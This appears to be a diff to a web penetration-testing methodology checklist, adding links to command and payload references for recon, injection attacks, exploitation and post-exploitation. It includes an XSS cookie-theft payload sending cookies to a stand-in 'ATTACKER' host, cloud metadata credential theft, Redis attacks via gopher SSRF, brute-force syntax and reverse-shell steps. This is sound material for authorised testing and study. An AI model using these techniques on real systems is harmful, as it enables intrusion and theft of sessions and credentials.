@@ -6,6 +6,9 @@
 ## 2. Information Gathering & Reconnaissance
 
 ### Technology Fingerprinting
+See the following command references for syntax and examples:
+- [WhatWeb / Banner Grabbing commands](commands.md#whatweb--banner-grabbing)
+
 1. **Identify the web server** — Apache, Nginx, IIS, LiteSpeed; version info from headers, error pages, and default files
 2. **Identify backend language/framework** — PHP, ASP.NET, Python/Flask/Django, Ruby, Node.js; check file extensions, headers, cookies, and error messages
 3. **Identify CMS** — WordPress, Joomla, Drupal, etc.; check `/wp-login.php`, `/administrator`, meta generators, and page source
@@ -17,6 +20,11 @@
 9. **Identify WAF presence** — unusual response codes, altered error pages, or blocked payloads indicate a WAF; identify vendor for bypass research
 
 ### Directory & File Enumeration
+See the following command references for syntax and examples:
+- [ffuf](commands.md#ffuf)
+- [gobuster](commands.md#gobuster)
+- [feroxbuster](commands.md#feroxbuster-recursive)
+
 1. **Run a directory brute-force** — use gobuster, feroxbuster, or ffuf with SecLists wordlists to discover hidden directories and files
 2. **Use multiple wordlists** — run with common.txt first, then directory-list-2.3-medium; different lists find different paths
 3. **Enumerate file extensions** — fuzz for `.php`, `.asp`, `.aspx`, `.txt`, `.bak`, `.old`, `.zip`, `.conf`, `.log` in discovered directories
@@ -27,6 +35,10 @@
 8. **Check for sensitive files** — `.git/`, `.env`, `config.php`, `web.config`, `settings.py`, `database.yml`, `id_rsa`
 
 ### Virtual Host & Subdomain Discovery
+See the following command references for syntax and examples:
+- [ffuf vhost fuzzing](commands.md#ffuf)
+- [gobuster DNS/vhost modes](commands.md#gobuster)
+
 1. **Enumerate subdomains** — use ffuf or gobuster DNS mode with SecLists subdomains wordlist
 2. **Fuzz for virtual hosts** — use ffuf with the `Host` header to discover vhosts on the same IP that aren't in DNS
 3. **Check certificate SANs** — SSL certificates often list multiple vhosts; check with `openssl` or crt.sh
@@ -103,6 +115,10 @@
 ## 3. Vulnerability Assessment
 
 ### SQL Injection
+See the following command references for syntax and examples:
+- [SQL Injection payloads](payloads.md#sql-injection-payloads)
+- [Sqlmap Usage](commands.md)
+
 1. **Test all input vectors** — URL parameters, form fields, cookies, HTTP headers (User-Agent, Referer, X-Forwarded-For)
 2. **Check for error-based SQLi** — inject single quotes `'`, double quotes `"`, and comments `--`; look for database error messages
 3. **Check for blind SQLi** — use boolean conditions (`AND 1=1`, `AND 1=2`) and time-based payloads (`SLEEP(5)`, `WAITFOR DELAY`) to infer injection
@@ -113,6 +129,9 @@
 8. **Assess impact** — determine what data is accessible, whether OS interaction is possible (xp_cmdshell, INTO OUTFILE), and privilege level
 
 ### Cross-Site Scripting (XSS)
+See the following command references for syntax and examples:
+- [XSS Payloads](payloads.md#xss-payloads)
+
 1. **Test for reflected XSS** — inject `<script>alert(1)</script>` and variations into URL parameters and form fields; check if it reflects in the response
 2. **Test for stored XSS** — inject payloads into persistent inputs (comments, profiles, usernames); check if they execute when viewed
 3. **Test for DOM XSS** — review JS for dangerous sinks (`innerHTML`, `document.write`, `eval`, `location.href`); trace user-controllable sources into sinks
@@ -121,6 +140,10 @@
 6. **Assess impact** — in a pentest context, XSS impact includes session hijacking, credential theft, keylogging, and CSRF bypass
 
 ### Local File Inclusion (LFI) / Remote File Inclusion (RFI)
+See the following command references for syntax and examples:
+- [LFI / Path Traversal Payloads](payloads.md#lfi--path-traversal-payloads)
+- [PHP wrappers](payloads.md#php-wrappers)
+
 1. **Identify file inclusion parameters** — look for parameters like `page=`, `file=`, `include=`, `path=`, `template=`
 2. **Test for LFI** — attempt to read `/etc/passwd` (Linux) or `C:\Windows\win.ini` (Windows) via path traversal (`../../../etc/passwd`)
 3. **Try path traversal variations** — URL encode (`%2f`), double encode, null byte (`%00`), and filter bypass techniques
@@ -138,6 +161,9 @@
 6. **Escalate to RCE** — SSRF against internal services (Redis, Memcached, Elasticsearch, Docker API) can lead to RCE
 
 ### XML External Entity (XXE)
+See the following command references for syntax and examples:
+- [XXE Payloads](payloads.md#xxe-payloads)
+
 1. **Identify XML input** — any endpoint accepting XML; also test JSON endpoints that may accept XML with a content-type change
 2. **Test for basic XXE** — inject an external entity referencing a local file (`file:///etc/passwd`)
 3. **Test for blind XXE** — use out-of-band techniques (DNS/HTTP callbacks) when the response doesn't reflect the injected content
@@ -178,6 +204,9 @@
 8. **Check for file overwrite** — can you overwrite existing files including `.htaccess` or `web.config`?
 
 ### Command Injection
+See the following command references for syntax and examples:
+- [Command Injection Filter Bypasses](payloads.md#command-injection-filter-bypasses)
+
 1. **Identify OS command execution candidates** — features that ping, traceroute, run system commands, or process user-supplied filenames
 2. **Test injection characters** — `;`, `&&`, `||`, `|`, `` ` ``, `$()`, newlines — inject after a valid value and before your command
 3. **Test for blind command injection** — use `sleep 5` or `ping -c 5 127.0.0.1` to detect execution via time delay
@@ -186,6 +215,9 @@
 6. **Test in all input vectors** — form fields, URL parameters, HTTP headers, and file names
 
 ### Server-Side Template Injection (SSTI)
+See the following command references for syntax and examples:
+- [SSTI Payloads](payloads.md#ssti-payloads)
+
 1. **Identify template engines** — Jinja2 (Python), Twig (PHP), Freemarker (Java), Pebble, Smarty, Mako — often revealed by errors
 2. **Test for SSTI** — inject `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` and look for `49` in the response
 3. **Identify the template engine** — different engines use different syntax; use a decision tree to identify the engine from responses
@@ -310,6 +342,9 @@
 6. **Upload `.htaccess`** — on Apache, upload a `.htaccess` file that treats `.jpg` as PHP to bypass extension filters
 
 ### LFI to RCE
+See the following command references for syntax and examples:
+- [LFI / Path Traversal Payloads - Log poisoning and wrapper techniques](payloads.md#log-poisoning--user-agent-injection)
+
 1. **Log poisoning** — inject PHP code into User-Agent or other logged fields, then include the log file via LFI
 2. **PHP session file inclusion** — inject PHP code into a session value, then include `/var/lib/php/sessions/sess_<id>`
 3. **`/proc/self/environ` inclusion** — inject PHP code into the HTTP_USER_AGENT environment variable, then include via LFI
@@ -318,12 +353,19 @@
 6. **`pearcmd.php` inclusion** — if PEAR is installed, include `/usr/local/lib/php/pearcmd.php` with a crafted `+config-create` query string to write a webshell to disk
 
 ### Command Injection Exploitation
+See the following command references for syntax and examples:
+- [Reverse Shells](payloads.md#reverse-shells)
+- [Command Injection Filter Bypasses](payloads.md#command-injection-filter-bypasses)
+
 1. **Confirm injection point and OS** — run `id` (Linux) or `whoami` (Windows) to confirm execution and identify user
 2. **Establish a reverse shell** — use bash, python, perl, or powershell reverse shell one-liners depending on OS
 3. **Upgrade the shell** — stabilize the reverse shell using the Shell Handling steps in methodology.md
 4. **Test for filtered characters** — if some characters are blocked, use alternatives (`${IFS}` for spaces, hex encoding, etc.)
 
 ### SSRF Exploitation
+See the following command references for syntax and examples:
+- [SSRF exploitation commands](commands.md)
+
 1. **Scan internal network** — use SSRF to probe `http://192.168.x.x:PORT` for internal services
 2. **Access internal APIs** — reach internal admin panels, metadata endpoints, and management interfaces
 3. **Cloud metadata theft** — retrieve IAM credentials from `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
@@ -332,12 +374,18 @@
 6. **Gopher protocol exploitation** — use `gopher://` URLs to send raw TCP payloads; attack Redis (`gopher://127.0.0.1:6379/...`), Memcached, SMTP, and other non-HTTP services via SSRF
 
 ### SSTI Exploitation
+See the following command references for syntax and examples:
+- [SSTI Payloads - Jinja2, Twig, Freemarker, and ERB RCE chains](payloads.md#ssti-payloads)
+
 1. **Confirm RCE with id/whoami** — once the engine is identified, use the appropriate RCE payload to confirm code execution
 2. **Jinja2 RCE chain** — traverse Python class hierarchy to reach `os.popen` or `subprocess.Popen`
 3. **Twig RCE** — use `_self.env.registerUndefinedFilterCallback` or equivalent for RCE in PHP Twig
 4. **Establish a reverse shell** — use the SSTI RCE to execute a reverse shell payload
 
 ### XSS Exploitation
+See the following command references for syntax and examples:
+- [XSS Payloads - Cookie theft and filter bypass techniques](payloads.md#xss-payloads)
+
 1. **Cookie theft** — use `document.cookie` to exfiltrate session cookies to your attack server: `<script>fetch('http://ATTACKER/steal?c='+document.cookie)</script>`
 2. **Session hijacking** — capture the victim's session cookie and import it into your browser to take over their session
 3. **Credential harvesting via phishing overlay** — inject a fake login form over the page to capture credentials; useful for stored XSS on login pages
@@ -348,6 +396,9 @@
 8. **Exfiltrate page content** — read sensitive page content (tokens, API keys, hidden fields) and send to your server
 
 ### XXE Exploitation
+See the following command references for syntax and examples:
+- [XXE Payloads - File read, OOB exfiltration, and SSRF techniques](payloads.md#xxe-payloads)
+
 1. **Basic file read** — use a DOCTYPE with an external entity pointing to `file:///etc/passwd` or `file:///c:/windows/win.ini`
 2. **Out-of-band (OOB) exfiltration** — use a DTD hosted on your server to exfiltrate file contents via DNS or HTTP when the response doesn't reflect output
 3. **Error-based XXE** — trigger XML parsing errors that include file contents in the error message when OOB is unavailable
@@ -365,6 +416,11 @@
 7. **Upgrade to a reverse shell** — once RCE is confirmed, use the deserialization payload to execute a reverse shell
 
 ### Password Attacks on Web
+See the following command references for syntax and examples:
+- [Hashcat](commands.md#hashcat)
+- [Hydra](commands.md#hydra-online-brute-force)
+- [Kerbrute](commands.md#kerbrute)
+
 1. **Brute-force login with Hydra** — use `hydra -L users.txt -P passwords.txt http-post-form` for form-based login; adapt the failure string to match the app
 2. **Brute-force with Burp Intruder** — capture the login request in Burp; use Intruder with Sniper or Cluster Bomb attack to iterate credentials
 3. **Credential stuffing** — use breach credential lists against the login form; many users reuse passwords across services
@@ -374,6 +430,10 @@
 7. **Password spraying** — test one or two common passwords against all discovered usernames to avoid lockout
 
 ### WAF Detection & Bypass
+See the following command references for syntax and examples:
+- [sqlmap tamper scripts](commands.md)
+- [Command Injection Filter Bypasses](payloads.md#command-injection-filter-bypasses)
+
 1. **Detect WAF presence** — use wafw00f to identify the WAF vendor; different WAFs have different bypass techniques
 2. **Identify blocked characters/patterns** — submit simple test payloads and observe which characters or keywords trigger blocking
 3. **Case variation** — `SeLeCt`, `<ScRiPt>`, `uNiOn` to bypass case-sensitive signature matching
@@ -393,6 +453,11 @@
 ## 5. Post-Exploitation
 
 ### From Web Shell to Reverse Shell
+See the following command references for syntax and examples:
+- [Reverse Shells](payloads.md#reverse-shells)
+- [Shell Upgrade & Stabilization](payloads.md#shell-upgrade--stabilization)
+- [msfvenom Payloads](payloads.md#msfvenom-payloads)
+
 1. **Identify available interpreters** — check for bash, python, python3, perl, ruby, php, and nc on the target
 2. **Execute a reverse shell one-liner** — use the appropriate reverse shell for the available interpreter and OS
 3. **Use the webshell to download and execute** — if one-liners are blocked, download a reverse shell binary or script from your attack box and execute it
@@ -411,6 +476,11 @@
 7. **Check for container/Docker indicators** — look for `/.dockerenv`, check `/proc/1/cgroup` for container runtime strings; if containerized, enumerate for escape vectors (writable Docker socket, privileged mode, host mounts)
 
 ### Credential Harvesting from Web Applications
+See the following command references for syntax and examples:
+- [MSSQL](commands.md#mssql-port-1433)
+- [MySQL](commands.md#mysql-port-3306)
+- [database enumeration commands](commands.md)
+
 1. **Extract database credentials from config files** — read connection strings and test credentials against the database and other services
 2. **Dump application user tables** — connect to the database and extract usernames and password hashes; crack offline
 3. **Check for hardcoded credentials in source** — search the codebase for passwords, API keys, and tokens
@@ -435,6 +505,11 @@
 6. **Document what was exfiltrated** — record all files accessed and exfiltrated for accurate reporting; do not retain actual sensitive data beyond the engagement
 
 ### Pivoting from Web Server
+See the following command references for syntax and examples:
+- [Pivoting & Tunneling](commands.md#pivoting--tunneling)
+- [Chisel](commands.md#chisel)
+- [SSH Tunnels](commands.md#ssh-tunnels)
+
 1. **Enumerate network interfaces** — run `ip a` or `ifconfig`; web servers are frequently multi-homed with access to internal DB and app networks
 2. **Scan for internal hosts** — use the web server as a pivot point to reach internal subnets not accessible from outside; use ping sweeps, nmap via proxychains, or a simple bash/PowerShell sweep
 3. **Identify internal services** — common internal targets reachable from web servers: database servers (3306, 5432, 1433), Redis (6379), internal admin panels, LDAP/AD (389)
